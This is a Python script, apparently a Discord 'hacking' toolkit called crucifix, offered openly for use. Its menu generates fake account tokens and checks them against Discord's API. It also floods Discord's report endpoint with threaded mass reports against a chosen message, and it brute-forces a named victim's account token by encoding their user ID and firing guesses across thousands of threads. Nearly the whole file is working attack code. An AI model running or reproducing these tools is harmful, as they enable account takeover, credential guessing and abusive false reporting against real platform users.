import ctypes
import colorama
import os
import sys
import time
import requests
import string
import random
import os.path
import discord
import string
import requests as req
import datetime
import random
import base64
import os
import datetime
from datetime import date
import threading
import pypresence
import requests
import discord, os, json
from pypresence import Presence
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore, Style, init
from threading import Thread as thr
from os import system, name
COMMANDS = ["1","2","3","4","clear","cls","logout","exit","quit"]
current_path = os.path.dirname(os.path.realpath(__file__))
date = date.today()
now = datetime.datetime.now()

def crucifix_clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

try:
	client_id = '787480345222184961'
	RPC = Presence(client_id)
	RPC.connect()
	RPC.update(details="idling.", state="s4cial - github", large_image="crucifix", start=int(round(time.time() * 1000)),)
except Exception as e:
	crucifix_clear()

def crucifix_main():
    global newprompt
    newprompt = True
    ctypes.windll.kernel32.SetConsoleTitleW(
    f"crucifix | discord tools | created by social")
    print("")
    print("")
    crucifix_clear()
    print(f'''\n
            NOW LOADED:{Fore.BLUE}
           {Fore.BLUE} ██████╗██████╗ ██╗   ██╗ ██████╗██╗███████╗██╗██╗  ██╗ 1{Fore.RESET} = TOKENGEN
           {Fore.BLUE}██╔════╝██╔══██╗██║   ██║██╔════╝██║██╔════╝██║╚██╗██╔╝ 2{Fore.RESET} = TOKENCHECK
           {Fore.BLUE}██║     ██████╔╝██║   ██║██║     ██║█████╗  ██║ ╚███╔╝  3{Fore.RESET} = ID-REPORT 
           {Fore.BLUE}██║     ██╔══██╗██║   ██║██║     ██║██╔══╝  ██║ ██╔██╗  4{Fore.RESET} = ID-BRUTE
           {Fore.BLUE}╚██████╗██║  ██║╚██████╔╝╚██████╗██║██║     ██║██╔╝ ██╗ AUTHOR{Fore.RESET}: "s4cial"
            {Fore.BLUE}╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚═╝╚═╝  ╚═╝ VERSION{Fore.RESET}: 1.0
        ═══════════════════════════════════════════════════════════════════
         [{Fore.BLUE}1{Fore.RESET}] GENERATOR  | [{Fore.BLUE}2{Fore.RESET}] CHECKER | [{Fore.BLUE}3{Fore.RESET}] ID-PAYLOAD | [{Fore.BLUE}4{Fore.RESET}] ID-BRUTEFORCE
        ═══════════════════════════════════════════════════════════════════''')

def crucifix_generator():
    count = 0
    print(f"[{Fore.BLUE}1{Fore.RESET}] > TOKEN GENERATOR | CHOSEN ")
    cantidad = input(f"[{Fore.BLUE}AMOUNT{Fore.RESET}] > ")
    while(int(count)<int(cantidad)):
        firstGen = random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+ random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        secondGen = "MT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        thirdGen = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        fourthGen = "MD"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        fifthGen = "mfa."+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        f= open(current_path +"/"+str("tokens")+str("")+".txt","a")
        f.write(firstGen+"\n"+secondGen+"\n"+thirdGen+"\n"+fourthGen+"\n"+fifthGen+"\n")
        print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > " + firstGen)
        print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > " + secondGen)
        print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > " + thirdGen)
        print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > " + fourthGen)
        print(f"[{Fore.BLUE}TOKEN{Fore.RESET}] > " + fifthGen)
        count+=1
        if int(count)==int(cantidad):
                print(f"\n[{Fore.BLUE}TOKENS GENERATED{Fore.RESET}] | CRUCIFIX | S4CIAL")
                print(f"[{Fore.BLUE}TOKENS{Fore.RESET}] SAVED TO > 'TOKENS.TXT'")
                input("ANY KEY TO RETURN >")
                crucifix_main()
                pass
                pass

def crucifix_checker():
    crucifix_main()
    input(f"[{Fore.BLUE}!{Fore.RESET}] CONTINUE? | APPLICATION WILL {Fore.BLUE}BREAK{Fore.RESET} WITHOUT A {Fore.BLUE}TOKENS.TXT{Fore.RESET}")
    with open('tokens.txt', 'r') as f:
        for line in f:
            time.sleep(0)
            token = line.rstrip("\n")
            headers = {
                'Authorization': f'{token}'  
	        }
            src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
            try:
                if src.status_code == 200:
	                print(f"[{Fore.BLUE}VALID TOKEN{Fore.RESET}] > " + token)
                else:
	                print(f"[{Fore.BLUE}INVALID TOKEN{Fore.RESET}] > " + token)
            except Exception:
                print (f"TOKEN-CHECKER [{Fore.BLUE}FAILED{Fore.RESET}] | CHECK INTERNET CONNECTIVITY, OR TRY AGAIN LATER")

class Reporter:
    def __init__(self):
        self.session = requests.Session()
        self.session.trust_env = False
        self.reported = 0
        self.errors = 0

    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW('crucifix | discord tools | created by social | sent > {0} | errors > {1}'.format(self.reported, self.errors))

    def crucifix_report(self):
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
            'User-Agent': 'Discord/21887 CFNetwork/1197 Darwin/20.0.0',
            'Content-Type': 'application/json',
            'Authorization': self.token
        }
        json = {
            'channel_id': self.channel_id, 
            'message_id': self.message_id, 
            'guild_id': self.guild_id, 
            'reason': self.reason
        }
        crucifix_report = self.session.post('https://discordapp.com/api/v8/report', json = json, headers = headers)
        if crucifix_report.status_code == 201:
            self.reported += 1
            self.title()
        else:
            self.errors += 1
            self.title()

    def reasons(self):
        print('\n{0} [>] {1}[1] > [ILLEGAL CONTENT]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[2] > [HARASSMENT]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[3] > [SPAM/PHISHING]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[4] > [SELF-HARM]'.format(Fore.BLUE, Fore.WHITE))
        print('{0} [>] {1}[5] > [NSFW]'.format(Fore.BLUE, Fore.WHITE))
        option = str(input('\n{0} > {1}'.format(Fore.BLUE, Fore.WHITE)))
        if option == '1' or option == 'Illegal Content':
            self.reason = 0
        elif option == '2' or option == 'Harassment':
            self.reason = 1
        elif option == '3' or option == 'Spam or Phishing Links':
            self.reason = 2
        elif option == '4' or option == 'Self Harm':
            self.reason = 3
        elif option == '5' or option == 'NSFW Content':
            self.reason = 4
        else:
            self.reasons()
    
    def start(self):
        self.reasons()
        def my_function():
            self.crucifix_report()
        while True:
            if threading.active_count() <= self.threads:
                threading.Thread(target = my_function).start()

    def main(self):
        self.token = str(input('\n{0} [>] {1}[TOKEN] > '.format(Fore.BLUE, Fore.WHITE)))
        self.guild_id = str(input('{0} [>] {1}[GUILD ID] >'.format(Fore.BLUE, Fore.WHITE)))
        self.channel_id = str(input('{0} [>] {1}[CHANNEL ID] > '.format(Fore.BLUE, Fore.WHITE)))
        self.message_id = int(input('{0} [>] {1}[MESSAGE ID] > '.format(Fore.BLUE, Fore.WHITE)))
        self.threads = int(input('{0} [>] {1}[THREADS] > '.format(Fore.BLUE, Fore.WHITE)))
        self.start()
    init(convert = True, autoreset = True)

def crucifix_idbruteforce():
 TOKEN = input(f"[{Fore.BLUE}T{Fore.RESET}] YOUR TOKEN > ")
 class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"[{Fore.BLUE}?{Fore.RESET}] VICTIMS ID > ")

    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")

    print(f"[{Fore.BLUE}X{Fore.RESET}] BRUTEFORCING > {user}")
    time.sleep(3)
    for i in range(10000):
      thr(target = gen, args = (encodedid, encodedstamp)).start()

 def gen(encodedid, encodedstamp):
  while True:
    second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    token = f"{encodedid}.{second}.{end}"
    headers = {'Content-Type': 'application/json', 'authorization': token}
    url = "https://discordapp.com/api/v6/users/@me/library"
    r = req.get(url, headers=headers)
    if r.status_code == 200:

        print(f'[{Fore.BLUE}T{Fore.RESET}] {token} > {Fore.BLUE}VALID{Fore.RESET}')
        f = open("token.txt", "a")
        f.write(token)
        f.close() 
        exit(0)
    else:
        print(f'[{Fore.BLUE}T{Fore.RESET}] {token} > INVALID{Fore.RESET}')
    token = os.environ.get(TOKEN)
 client = MyClient()
 client.run(TOKEN, bot=False,)

def crucifix_idpayload():
 Reporter().main()

def cmds():
    global newprompt
    if newprompt:
        newprompt = False
        command = input(
            f"   ╔════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.BLUE}crucifix{Fore.RESET}@user {Fore.BLUE}~{Fore.RESET} ")
    else:
        command = input(
            f"   ╠════════════[{Fore.BLUE}<>{Fore.RESET}]\n   ╚═══>{Fore.BLUE}crucifix{Fore.RESET}@user {Fore.BLUE}~{Fore.RESET} ")
    if command not in COMMANDS:
        print(
            f"   ╠═[{Fore.BLUE}X{Fore.RESET}] {Fore.BLUE}INVALID{Fore.RESET} CMD")
        cmds()
    if command == "1":
        crucifix_generator()
    elif command == "2":
        crucifix_checker()
    elif command == "3":
        crucifix_idpayload()
    elif command == "4":
        crucifix_idbruteforce()
    elif command == "clear":
        crucifix_main()
    elif command == "cls":
        crucifix_main()
    elif command == "exit":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")
    elif command == "quit":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")
    elif command == "logout":
        sys.exit("   ╠═[X] EXITING > GOODBYE.")

crucifix_main()
while True:
    try:
        cmds()
    except KeyboardInterrupt:
        print('')
        pass
